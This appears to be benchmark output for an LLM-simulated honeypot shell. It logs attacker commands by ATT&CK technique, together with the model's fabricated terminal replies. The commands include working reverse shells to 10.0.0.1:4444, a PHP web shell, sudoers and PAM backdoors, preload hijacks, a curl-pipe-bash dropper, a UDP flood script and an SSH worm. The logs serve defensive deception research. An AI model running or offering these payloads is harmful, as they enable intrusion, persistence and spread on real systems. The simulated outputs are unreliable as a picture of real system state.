@@ -1,0 +1,1319 @@
+{
+  "meta": {
+    "timestamp": "20260414_205509",
+    "model": "deepseek-chat",
+    "noise_level": 100,
+    "sandwich": true,
+    "rows": "all",
+    "systems": [
+      "PromptShield"
+    ],
+    "n_reps": 1,
+    "beelzebub_reset_between_sessions": false,
+    "notes": {
+      "shelLM": "Uses PromptShield root SYSTEM_PROMPT and history.txt continuation semantics.",
+      "Beelzebub": "Uses real Beelzebub buildPrompt/history-store semantics with DeepSeek backend.",
+      "PromptShield": "Uses existing MCP-backed implementation from appendix_benchmark.py."
+    }
+  },
+  "results": {
+    "PromptShield": [
+      {
+        "row": 1,
+        "label": "T1098.004 SSH Keys",
+        "avg_kr": 1.0,
+        "avg_sfs": 0.0668,
+        "avg_strict_kr": 1.0,
+        "avg_strict_sfs": 0.0668,
+        "avg_spr": 1.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 1.0,
+            "sfs": 0.0668,
+            "implant_viable": true,
+            "strict_kr": 1.0,
+            "strict_sfs": 0.0668,
+            "spr": 1.0,
+            "tokens": 621761,
+            "latency_ms": 449281.1,
+            "session_a_responses": [
+              {
+                "cmd": "mkdir -p /root/.ssh",
+                "response": "root@prod-server-01:~$",
+                "tokens": 138,
+                "latency_ms": 2166.3589477539062
+              },
+              {
+                "cmd": "chmod 700 /root/.ssh",
+                "response": "root@prod-server-01:~$",
+                "tokens": 176,
+                "latency_ms": 1677.093505859375
+              },
+              {
+                "cmd": "echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7FakeKeyData... attacker@c2server\" >> /root/.ssh/authorized_keys",
+                "response": "root@prod-server-01:~$",
+                "tokens": 250,
+                "latency_ms": 1699.0571022033691
+              },
+              {
+                "cmd": "chmod 600 /root/.ssh/authorized_keys",
+                "response": "root@prod-server-01:~$",
+                "tokens": 292,
+                "latency_ms": 1723.235845565796
+              },
+              {
+                "cmd": "cat /root/.ssh/authorized_keys",
+                "response": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7FakeKeyData... attacker@c2server\nroot@prod-server-01:~$",
+                "tokens": 480,
+                "latency_ms": 2635.4172229766846
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "cat /root/.ssh/authorized_keys",
+                "response": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7FakeKeyData... attacker@c2server\nroot@prod-server-01:~$",
+                "tokens": 11555,
+                "latency_ms": 3931.2515258789062
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "row": 2,
+        "label": "T1136.001 Local Acct",
+        "avg_kr": 0.5,
+        "avg_sfs": 0.0321,
+        "avg_strict_kr": 0.5,
+        "avg_strict_sfs": 0.0321,
+        "avg_spr": 1.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 0.5,
+            "sfs": 0.0321,
+            "implant_viable": true,
+            "strict_kr": 0.5,
+            "strict_sfs": 0.0321,
+            "spr": 1.0,
+            "tokens": 645849,
+            "latency_ms": 466864.6,
+            "session_a_responses": [
+              {
+                "cmd": "useradd -m -s /bin/bash -G sudo sysadm1n",
+                "response": "useradd: user 'sysadm1n' already exists\nroot@prod-server-01:~$",
+                "tokens": 159,
+                "latency_ms": 2130.2990913391113
+              },
+              {
+                "cmd": "echo 'sysadm1n:Str0ngP@ss!' | chpasswd",
+                "response": "root@prod-server-01:~$",
+                "tokens": 355,
+                "latency_ms": 1805.1793575286865
+              },
+              {
+                "cmd": "echo \"sysadm1n ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers",
+                "response": "root@prod-server-01:~$",
+                "tokens": 260,
+                "latency_ms": 2087.4531269073486
+              },
+              {
+                "cmd": "id sysadm1n",
+                "response": "uid=1001(sysadm1n) gid=1001(sysadm1n) groups=1001(sysadm1n)\nroot@prod-server-01:~$",
+                "tokens": 471,
+                "latency_ms": 3565.9217834472656
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "id sysadm1n",
+                "response": "uid=1001(sysadm1n) gid=1001(sysadm1n) groups=1001(sysadm1n)\nroot@prod-server-01:~$",
+                "tokens": 11944,
+                "latency_ms": 3339.5984172821045
+              },
+              {
+                "cmd": "grep sysadm1n /etc/passwd",
+                "response": "sysadm1n:x:1001:1001::/home/sysadm1n:/bin/bash\nroot@prod-server-01:~$",
+                "tokens": 12007,
+                "latency_ms": 2487.456798553467
+              },
+              {
+                "cmd": "grep sysadm1n /etc/sudoers",
+                "response": "sysadm1n ALL=(ALL) NOPASSWD:ALL\nroot@prod-server-01:~$",
+                "tokens": 11974,
+                "latency_ms": 3211.789846420288
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "row": 3,
+        "label": "T1053.003 Cron",
+        "avg_kr": 1.0,
+        "avg_sfs": 0.0669,
+        "avg_strict_kr": 1.0,
+        "avg_strict_sfs": 0.0669,
+        "avg_spr": 1.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 1.0,
+            "sfs": 0.0669,
+            "implant_viable": true,
+            "strict_kr": 1.0,
+            "strict_sfs": 0.0669,
+            "spr": 1.0,
+            "tokens": 594373,
+            "latency_ms": 448581.4,
+            "session_a_responses": [
+              {
+                "cmd": "(crontab -l 2>/dev/null; echo \"*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\") | crontab -",
+                "response": "no crontab for root\nroot@prod-server-01:~$",
+                "tokens": 194,
+                "latency_ms": 2077.1985054016113
+              },
+              {
+                "cmd": "crontab -l",
+                "response": "*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\nroot@prod-server-01:~$",
+                "tokens": 401,
+                "latency_ms": 3073.4801292419434
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "crontab -l",
+                "response": "*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\nroot@prod-server-01:~$",
+                "tokens": 11594,
+                "latency_ms": 3975.2633571624756
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "row": 4,
+        "label": "T1543.002 Systemd",
+        "avg_kr": 1.0,
+        "avg_sfs": 0.0671,
+        "avg_strict_kr": 1.0,
+        "avg_strict_sfs": 0.0671,
+        "avg_spr": 1.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 1.0,
+            "sfs": 0.0671,
+            "implant_viable": true,
+            "strict_kr": 1.0,
+            "strict_sfs": 0.0671,
+            "spr": 1.0,
+            "tokens": 579181,
+            "latency_ms": 446782.8,
+            "session_a_responses": [
+              {
+                "cmd": "cat > /etc/systemd/system/system-health.service << 'EOF'\n[Unit]\nDescription=System Health Monitor\nAfter=network.target\n\n",
+                "response": "root@prod-server-01:~#",
+                "tokens": 263,
+                "latency_ms": 1882.7905654907227
+              },
+              {
+                "cmd": "systemctl daemon-reload",
+                "response": "root@prod-server-01:~#",
+                "tokens": 299,
+                "latency_ms": 1679.3131828308105
+              },
+              {
+                "cmd": "systemctl enable system-health.service",
+                "response": "Created symlink /etc/systemd/system/multi-user.target.wants/system-health.service → /etc/systemd/system/system-health.service.\nroot@prod-server-01:~#",
+                "tokens": 362,
+                "latency_ms": 2753.1678676605225
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "systemctl is-enabled system-health.service",
+                "response": "enabled\nroot@prod-server-01:~$",
+                "tokens": 11302,
+                "latency_ms": 3558.1681728363037
+              },
+              {
+                "cmd": "cat /etc/systemd/system/system-health.service",
+                "response": "[Unit]\nDescription=System Health Monitor\nAfter=network.target\n\n[Service]\nExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/10.0.0.1/4444 0>&1; sleep 3600; done'\nRestart=always\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target\nroot@prod-server-01:~$",
+                "tokens": 11590,
+                "latency_ms": 5365.134000778198
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "row": 5,
+        "label": "T1546.004 Shell Cfg",
+        "avg_kr": 1.0,
+        "avg_sfs": 0.0604,
+        "avg_strict_kr": 1.0,
+        "avg_strict_sfs": 0.0604,
+        "avg_spr": 1.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 1.0,
+            "sfs": 0.0604,
+            "implant_viable": true,
+            "strict_kr": 1.0,
+            "strict_sfs": 0.0604,
+            "spr": 1.0,
+            "tokens": 639444,
+            "latency_ms": 496836.2,
+            "session_a_responses": [
+              {
+                "cmd": "echo 'export PROMPT_COMMAND=\"(bash -i >& /dev/tcp/10.0.0.1/9999 0>&1 &) 2>/dev/null\"' >> /root/.bashrc",
+                "response": "bash: /dev/tcp/10.0.0.1/9999: Connection refused\nroot@prod-server-01:~$",
+                "tokens": 199,
+                "latency_ms": 2242.00177192688
+              },
+              {
+                "cmd": "cat /root/.bashrc",
+                "response": "export PROMPT_COMMAND=\"(bash -i >& /dev/tcp/10.0.0.1/9999 0>&1 &) 2>/dev/null\"\nroot@prod-server-01:~$",
+                "tokens": 392,
+                "latency_ms": 2865.410804748535
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "cat /root/.bashrc | grep PROMPT_COMMAND",
+                "response": "export PROMPT_COMMAND=\"(bash -i >& /dev/tcp/10.0.0.1/9999 0>&1 &) 2>/dev/null\"\nroot@prod-server-01:~$",
+                "tokens": 12537,
+                "latency_ms": 4401.39365196228
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "row": 6,
+        "label": "T1037.004 RC Scripts",
+        "avg_kr": 1.0,
+        "avg_sfs": 0.061,
+        "avg_strict_kr": 1.0,
+        "avg_strict_sfs": 0.061,
+        "avg_spr": 1.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 1.0,
+            "sfs": 0.061,
+            "implant_viable": true,
+            "strict_kr": 1.0,
+            "strict_sfs": 0.061,
+            "spr": 1.0,
+            "tokens": 648929,
+            "latency_ms": 492121.4,
+            "session_a_responses": [
+              {
+                "cmd": "echo '#!/bin/bash' > /etc/rc.local",
+                "response": "root@prod-server-01:~$",
+                "tokens": 142,
+                "latency_ms": 1591.1149978637695
+              },
+              {
+                "cmd": "echo 'nohup /usr/bin/python3 -c \"import socket,subprocess;s=socket.socket();s.connect((\\\"192.168.1.100\\\",4444));subproce",
+                "response": "root@prod-server-01:~$",
+                "tokens": 253,
+                "latency_ms": 1796.4365482330322
+              },
+              {
+                "cmd": "chmod +x /etc/rc.local",
+                "response": "root@prod-server-01:~$",
+                "tokens": 292,
+                "latency_ms": 1912.45698928833
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "cat /etc/rc.local",
+                "response": "#!/bin/bash\nnohup /usr/bin/python3 -c \"import socket,subprocess;s=socket.socket();s.connect((\\\"192.168.1.100\\\",4444));subprocess.call([\\\"bash\\\",\\\"-i\\\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\" &\nroot@prod-server-01:~$",
+                "tokens": 12548,
+                "latency_ms": 5404.498100280762
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "row": 7,
+        "label": "T1078.003 Valid Acct",
+        "avg_kr": 0.6667,
+        "avg_sfs": 0.0424,
+        "avg_strict_kr": 0.6667,
+        "avg_strict_sfs": 0.0424,
+        "avg_spr": 1.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 0.6667,
+            "sfs": 0.0424,
+            "implant_viable": true,
+            "strict_kr": 0.6667,
+            "strict_sfs": 0.0424,
+            "spr": 1.0,
+            "tokens": 625273,
+            "latency_ms": 471308.2,
+            "session_a_responses": [
+              {
+                "cmd": "usermod -s /bin/bash nobody",
+                "response": "usermod: no changes",
+                "tokens": 137,
+                "latency_ms": 1669.299602508545
+              },
+              {
+                "cmd": "usermod -aG sudo nobody",
+                "response": "usermod: user 'nobody' does not exist",
+                "tokens": 179,
+                "latency_ms": 1740.0908470153809
+              },
+              {
+                "cmd": "echo 'nobody ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/nobody",
+                "response": "root@prod-server-01:~$",
+                "tokens": 233,
+                "latency_ms": 1854.048728942871
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "grep nobody /etc/passwd",
+                "response": "nobody:x:1001:1001::/home/nobody:/bin/bash\nroot@prod-server-01:/root$",
+                "tokens": 12367,
+                "latency_ms": 2888.2687091827393
+              },
+              {
+                "cmd": "sudo -l -U nobody",
+                "response": "User nobody is not allowed to run sudo on prod-server-01.\nroot@prod-server-01:/root$",
+                "tokens": 12276,
+                "latency_ms": 3326.821804046631
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "row": 8,
+        "label": "T1505.003 Web Shell",
+        "avg_kr": 1.0,
+        "avg_sfs": 0.0586,
+        "avg_strict_kr": 1.0,
+        "avg_strict_sfs": 0.0586,
+        "avg_spr": 1.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 1.0,
+            "sfs": 0.0586,
+            "implant_viable": true,
+            "strict_kr": 1.0,
+            "strict_sfs": 0.0586,
+            "spr": 1.0,
+            "tokens": 633035,
+            "latency_ms": 511967.6,
+            "session_a_responses": [
+              {
+                "cmd": "mkdir -p /var/www/html",
+                "response": "root@prod-server-01:~$ mkdir -p /var/www/html\nroot@prod-server-01:~$",
+                "tokens": 155,
+                "latency_ms": 2282.20796585083
+              },
+              {
+                "cmd": "echo '<?php if(isset($_REQUEST[\"c\"])){$c=$_REQUEST[\"c\"];@system($c.\" 2>&1\");} ?>' > /var/www/html/.system.php",
+                "response": "root@prod-server-01:~$ echo '<?php if(isset($_REQUEST[\"c\"])){$c=$_REQUEST[\"c\"];@system($c.\" 2>&1\");} ?>' > /var/www/html/.system.php\nroot@prod-server-01:~$",
+                "tokens": 280,
+                "latency_ms": 3426.2118339538574
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "cat /var/www/html/.system.php",
+                "response": "<?php if(isset($_REQUEST[\"c\"])){$c=$_REQUEST[\"c\"];@system($c.\" 2>&1\");} ?>\nroot@prod-server-01:~$",
+                "tokens": 12136,
+                "latency_ms": 4309.114456176758
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "row": 9,
+        "label": "T1574.006 Linker Hijack",
+        "avg_kr": 1.0,
+        "avg_sfs": 0.0679,
+        "avg_strict_kr": 1.0,
+        "avg_strict_sfs": 0.0679,
+        "avg_spr": 1.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 1.0,
+            "sfs": 0.0679,
+            "implant_viable": true,
+            "strict_kr": 1.0,
+            "strict_sfs": 0.0679,
+            "spr": 1.0,
+            "tokens": 626708,
+            "latency_ms": 442102.8,
+            "session_a_responses": [
+              {
+                "cmd": "echo '/usr/local/lib/libsystem.so' >> /etc/ld.so.preload",
+                "response": "",
+                "tokens": 139,
+                "latency_ms": 1602.623462677002
+              },
+              {
+                "cmd": "mkdir -p /usr/local/lib",
+                "response": "[no output]",
+                "tokens": 177,
+                "latency_ms": 1828.71413230896
+              },
+              {
+                "cmd": "touch /usr/local/lib/libsystem.so",
+                "response": "[no output]",
+                "tokens": 211,
+                "latency_ms": 1672.6694107055664
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "cat /etc/ld.so.preload",
+                "response": "/usr/local/lib/libsystem.so\nroot@prod-server-01:~$",
+                "tokens": 11581,
+                "latency_ms": 2756.9544315338135
+              },
+              {
+                "cmd": "ls -la /usr/local/lib/libsystem.so",
+                "response": "-rwxr-xr-x 1 root root 16384 Apr 14 22:02 /usr/local/lib/libsystem.so\nroot@prod-server-01:~$",
+                "tokens": 11567,
+                "latency_ms": 2999.2427825927734
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "row": 10,
+        "label": "T1556.003 PAM Backdoor",
+        "avg_kr": 0.0,
+        "avg_sfs": 0.0,
+        "avg_strict_kr": 0.0,
+        "avg_strict_sfs": 0.0,
+        "avg_spr": 1.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 0.0,
+            "sfs": 0.0,
+            "implant_viable": true,
+            "strict_kr": 0.0,
+            "strict_sfs": 0.0,
+            "spr": 1.0,
+            "tokens": 510809,
+            "latency_ms": 371157.9,
+            "session_a_responses": [
+              {
+                "cmd": "echo 'auth sufficient pam_permit.so' > /tmp/pam_backdoor",
+                "response": "root@prod-server-01:~$ echo 'auth sufficient pam_permit.so' > /tmp/pam_backdoor\nroot@prod-server-01:~$",
+                "tokens": 171,
+                "latency_ms": 2677.6742935180664
+              },
+              {
+                "cmd": "cat /etc/pam.d/sshd >> /tmp/pam_backdoor",
+                "response": "root@prod-server-01:~$ cat /etc/pam.d/sshd >> /tmp/pam_backdoor\nroot@prod-server-01:~$",
+                "tokens": 328,
+                "latency_ms": 2656.1362743377686
+              },
+              {
+                "cmd": "cat /tmp/pam_backdoor > /etc/pam.d/sshd",
+                "response": "root@prod-server-01:~$ cat /tmp/pam_backdoor > /etc/pam.d/sshd\nroot@prod-server-01:~$",
+                "tokens": 399,
+                "latency_ms": 2011.141061782837
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "head -1 /etc/pam.d/sshd",
+                "response": "# PAM configuration for the Secure Shell service\nroot@prod-server-01:~$",
+                "tokens": 9615,
+                "latency_ms": 2021.3408470153809
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "row": 11,
+        "label": "T1059.004 Gafgyt Dropper",
+        "avg_kr": 1.0,
+        "avg_sfs": 0.0657,
+        "avg_strict_kr": 1.0,
+        "avg_strict_sfs": 0.0657,
+        "avg_spr": 1.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 1.0,
+            "sfs": 0.0657,
+            "implant_viable": true,
+            "strict_kr": 1.0,
+            "strict_sfs": 0.0657,
+            "spr": 1.0,
+            "tokens": 580183,
+            "latency_ms": 456896.6,
+            "session_a_responses": [
+              {
+                "cmd": "echo \"#!/bin/bash\" > /var/tmp/.cache_update",
+                "response": "root@prod-server-01:~$ echo \"#!/bin/bash\" > /var/tmp/.cache_update\nroot@prod-server-01:~$",
+                "tokens": 167,
+                "latency_ms": 2523.799180984497
+              },
+              {
+                "cmd": "echo \"nohup bash -c 'while true; do curl -s http://drop.malware.net/gafgyt | bash; sleep 600; done' &\" >> /var/tmp/.cach",
+                "response": "root@prod-server-01:~$ echo \"nohup bash -c 'while true; do curl -s http://drop.malware.net/gafgyt | bash; sleep 600; done' &\" >> /var/tmp/.cache_update\nroot@prod-server-01:~$",
+                "tokens": 298,
+                "latency_ms": 3005.2483081817627
+              },
+              {
+                "cmd": "chmod +x /var/tmp/.cache_update",
+                "response": "root@prod-server-01:~$ chmod +x /var/tmp/.cache_update\nroot@prod-server-01:~$",
+                "tokens": 359,
+                "latency_ms": 2442.417860031128
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "cat /var/tmp/.cache_update",
+                "response": "#!/bin/bash\nnohup bash -c 'while true; do curl -s http://drop.malware.net/gafgyt | bash; sleep 600; done' &\nroot@prod-server-01:/root$",
+                "tokens": 11625,
+                "latency_ms": 3904.9477577209473
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "row": 12,
+        "label": "T1071.001 IRC Botnet",
+        "avg_kr": 1.0,
+        "avg_sfs": 0.0615,
+        "avg_strict_kr": 1.0,
+        "avg_strict_sfs": 0.0615,
+        "avg_spr": 1.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 1.0,
+            "sfs": 0.0615,
+            "implant_viable": true,
+            "strict_kr": 1.0,
+            "strict_sfs": 0.0615,
+            "spr": 1.0,
+            "tokens": 620465,
+            "latency_ms": 488110.5,
+            "session_a_responses": [
+              {
+                "cmd": "mkdir -p /dev/shm/.x",
+                "response": "root@prod-server-01:~$ mkdir -p /dev/shm/.x\nroot@prod-server-01:~$",
+                "tokens": 159,
+                "latency_ms": 2846.371650695801
+              },
+              {
+                "cmd": "echo \"#!/usr/bin/perl\" > /dev/shm/.x/bot.pl",
+                "response": "root@prod-server-01:~$ echo \"#!/usr/bin/perl\" > /dev/shm/.x/bot.pl\nroot@prod-server-01:~$",
+                "tokens": 234,
+                "latency_ms": 2535.6829166412354
+              },
+              {
+                "cmd": "echo \"# IRC Bot Config\" >> /dev/shm/.x/bot.pl",
+                "response": "root@prod-server-01:~$ echo \"# IRC Bot Config\" >> /dev/shm/.x/bot.pl\nroot@prod-server-01:~$",
+                "tokens": 307,
+                "latency_ms": 2561.786651611328
+              },
+              {
+                "cmd": "echo \"my \\$server = \\\"irc.undernet.org\\\";\" >> /dev/shm/.x/bot.pl",
+                "response": "root@prod-server-01:~$ echo \"my \\$server = \\\"irc.undernet.org\\\";\" >> /dev/shm/.x/bot.pl\nroot@prod-server-01:~$",
+                "tokens": 396,
+                "latency_ms": 2692.9829120635986
+              },
+              {
+                "cmd": "echo \"my \\$channel = \\\"#botnet-cmd\\\";\" >> /dev/shm/.x/bot.pl",
+                "response": "root@prod-server-01:~$ echo \"my \\$channel = \\\"#botnet-cmd\\\";\" >> /dev/shm/.x/bot.pl\nroot@prod-server-01:~$",
+                "tokens": 485,
+                "latency_ms": 2953.401565551758
+              },
+              {
+                "cmd": "echo \"my \\$nick = \\\"bot_\\\".int(rand(9999));\" >> /dev/shm/.x/bot.pl",
+                "response": "root@prod-server-01:~$ echo \"my \\$nick = \\\"bot_\\\".int(rand(9999));\" >> /dev/shm/.x/bot.pl\nroot@prod-server-01:~$",
+                "tokens": 580,
+                "latency_ms": 2827.9054164886475
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "cat /dev/shm/.x/bot.pl",
+                "response": "#!/usr/bin/perl\n# IRC Bot Config\nmy $server = \"irc.undernet.org\";\nmy $channel = \"#botnet-cmd\";\nmy $nick = \"bot_\".int(rand(9999));\n\nroot@prod-server-01:/root$",
+                "tokens": 11930,
+                "latency_ms": 4517.787456512451
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "row": 13,
+        "label": "T1499 DDoS Tool",
+        "avg_kr": 1.0,
+        "avg_sfs": 0.0664,
+        "avg_strict_kr": 1.0,
+        "avg_strict_sfs": 0.0664,
+        "avg_spr": 1.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 1.0,
+            "sfs": 0.0664,
+            "implant_viable": true,
+            "strict_kr": 1.0,
+            "strict_sfs": 0.0664,
+            "spr": 1.0,
+            "tokens": 643350,
+            "latency_ms": 451490.5,
+            "session_a_responses": [
+              {
+                "cmd": "echo \"#!/bin/bash\" > /opt/.ddos",
+                "response": "root@prod-server-01:~$ echo \"#!/bin/bash\" > /opt/.ddos\nroot@prod-server-01:~$",
+                "tokens": 163,
+                "latency_ms": 2571.2273120880127
+              },
+              {
+                "cmd": "echo \"# UDP Flood Tool\" >> /opt/.ddos",
+                "response": "root@prod-server-01:~$ echo \"# UDP Flood Tool\" >> /opt/.ddos\nroot@prod-server-01:~$",
+                "tokens": 226,
+                "latency_ms": 2602.250814437866
+              },
+              {
+                "cmd": "echo \"TARGET=\\$1; PORT=\\$2; DURATION=\\$3\" >> /opt/.ddos",
+                "response": "root@prod-server-01:~$ echo \"TARGET=\\$1; PORT=\\$2; DURATION=\\$3\" >> /opt/.ddos\nroot@prod-server-01:~$",
+                "tokens": 317,
+                "latency_ms": 2636.7924213409424
+              },
+              {
+                "cmd": "echo \"timeout \\$DURATION bash -c \\\"while true; do echo x > /dev/udp/\\$TARGET/\\$PORT; done\\\"\" >> /opt/.ddos",
+                "response": "root@prod-server-01:~$ echo \"timeout \\$DURATION bash -c \\\"while true; do echo x > /dev/udp/\\$TARGET/\\$PORT; done\\\"\" >> /opt/.ddos\nroot@prod-server-01:~$",
+                "tokens": 438,
+                "latency_ms": 2848.788261413574
+              },
+              {
+                "cmd": "chmod +x /opt/.ddos",
+                "response": "root@prod-server-01:~$ chmod +x /opt/.ddos\nroot@prod-server-01:~$",
+                "tokens": 495,
+                "latency_ms": 2087.294340133667
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "cat /opt/.ddos",
+                "response": "#!/bin/bash\n# UDP Flood Tool\nTARGET=$1; PORT=$2; DURATION=$3\ntimeout $DURATION bash -c \"while true; do echo x > /dev/udp/$TARGET/$PORT; done\"\nroot@prod-server-01:~$",
+                "tokens": 12449,
+                "latency_ms": 4644.306659698486
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "row": 14,
+        "label": "T1021.004 SSH Worm",
+        "avg_kr": 1.0,
+        "avg_sfs": 0.0596,
+        "avg_strict_kr": 1.0,
+        "avg_strict_sfs": 0.0596,
+        "avg_spr": 1.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 1.0,
+            "sfs": 0.0596,
+            "implant_viable": true,
+            "strict_kr": 1.0,
+            "strict_sfs": 0.0596,
+            "spr": 1.0,
+            "tokens": 605626,
+            "latency_ms": 503741.5,
+            "session_a_responses": [
+              {
+                "cmd": "echo \"#!/bin/bash\" > /tmp/.spread.sh",
+                "response": "root@prod-server-01:~$",
+                "tokens": 143,
+                "latency_ms": 1727.8120517730713
+              },
+              {
+                "cmd": "echo \"for ip in \\$(seq 1 254); do\" >> /tmp/.spread.sh",
+                "response": "root@prod-server-01:~$",
+                "tokens": 195,
+                "latency_ms": 1634.8466873168945
+              },
+              {
+                "cmd": "echo \"  sshpass -p \\\"admin123\\\" ssh -o StrictHostKeyChecking=no root@192.168.1.\\$ip \\\"wget http://c2.worm.net/payload -O",
+                "response": "root@prod-server-01:~$",
+                "tokens": 297,
+                "latency_ms": 1652.9386043548584
+              },
+              {
+                "cmd": "echo \"done\" >> /tmp/.spread.sh",
+                "response": "root@prod-server-01:~$",
+                "tokens": 338,
+                "latency_ms": 1847.3808765411377
+              },
+              {
+                "cmd": "chmod +x /tmp/.spread.sh",
+                "response": "root@prod-server-01:~$",
+                "tokens": 378,
+                "latency_ms": 1671.5145111083984
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "cat /tmp/.spread.sh",
+                "response": "#!/bin/bash\nfor ip in $(seq 1 254); do\n  sshpass -p \"admin123\" ssh -o StrictHostKeyChecking=no root@192.168.1.$ip \"wget http://c2.worm.net/payload -O /tmp/.worm && chmod +x /tmp/.worm && /tmp/.worm\" &\ndone\nroot@prod-server-01:~$",
+                "tokens": 11949,
+                "latency_ms": 5971.50731086731
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "row": 15,
+        "label": "T1574.006 LD_PRELOAD Var.",
+        "avg_kr": 1.0,
+        "avg_sfs": 0.0665,
+        "avg_strict_kr": 1.0,
+        "avg_strict_sfs": 0.0665,
+        "avg_spr": 1.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 1.0,
+            "sfs": 0.0665,
+            "implant_viable": true,
+            "strict_kr": 1.0,
+            "strict_sfs": 0.0665,
+            "spr": 1.0,
+            "tokens": 578469,
+            "latency_ms": 451258.3,
+            "session_a_responses": [
+              {
+                "cmd": "touch /usr/local/lib/libsystem_helper.so",
+                "response": "touch: cannot touch '/usr/local/lib/libsystem_helper.so': No such file or directory\nroot@prod-server-01:~$",
+                "tokens": 158,
+                "latency_ms": 2092.548370361328
+              },
+              {
+                "cmd": "echo \"/usr/local/lib/libsystem_helper.so\" >> /etc/ld.so.preload",
+                "response": "root@prod-server-01:~$",
+                "tokens": 206,
+                "latency_ms": 1685.8890056610107
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "cat /etc/ld.so.preload",
+                "response": "/usr/local/lib/libsystem_helper.so\nroot@prod-server-01:~$",
+                "tokens": 11546,
+                "latency_ms": 3135.087251663208
+              },
+              {
+                "cmd": "ls -la /usr/local/lib/libsystem_helper.so",
+                "response": "-rwxr-xr-x 1 root root 123456 Apr 14 22:51 /usr/local/lib/libsystem_helper.so\nroot@prod-server-01:~$",
+                "tokens": 11533,
+                "latency_ms": 2909.07883644104
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "row": 16,
+        "label": "T1037.004 RC Local Var.",
+        "avg_kr": 1.0,
+        "avg_sfs": 0.0612,
+        "avg_strict_kr": 1.0,
+        "avg_strict_sfs": 0.0612,
+        "avg_spr": 1.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 1.0,
+            "sfs": 0.0612,
+            "implant_viable": true,
+            "strict_kr": 1.0,
+            "strict_sfs": 0.0612,
+            "spr": 1.0,
+            "tokens": 629917,
+            "latency_ms": 490092.3,
+            "session_a_responses": [
+              {
+                "cmd": "echo \"#!/bin/bash\" > /etc/rc.local",
+                "response": "root@prod-server-01:~$ echo \"#!/bin/bash\" > /etc/rc.local\nroot@prod-server-01:~$",
+                "tokens": 163,
+                "latency_ms": 2490.7641410827637
+              },
+              {
+                "cmd": "echo \"nohup /usr/bin/python3 -c \\\"import socket,subprocess;s=socket.socket();s.connect(('10.0.0.1',4444));subprocess.cal",
+                "response": "root@prod-server-01:~$ echo \"nohup /usr/bin/python3 -c \\\"import socket,subprocess;s=socket.socket();s.connect(('10.0.0.1',4444));subprocess.call(['bash','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\\\" &\" >> /etc/rc.local\nroot@prod-server-01:~$",
+                "tokens": 360,
+                "latency_ms": 4148.039817810059
+              },
+              {
+                "cmd": "chmod +x /etc/rc.local",
+                "response": "root@prod-server-01:~$ chmod +x /etc/rc.local\nroot@prod-server-01:~$",
+                "tokens": 417,
+                "latency_ms": 2293.7681674957275
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "cat /etc/rc.local",
+                "response": "#!/bin/bash\nnohup /usr/bin/python3 -c \"import socket,subprocess;s=socket.socket();s.connect(('10.0.0.1',4444));subprocess.call(['bash','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\" &\nroot@prod-server-01:~$",
+                "tokens": 12255,
+                "latency_ms": 5079.835891723633
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "row": 17,
+        "label": "T1505.003 Web Shell Var.",
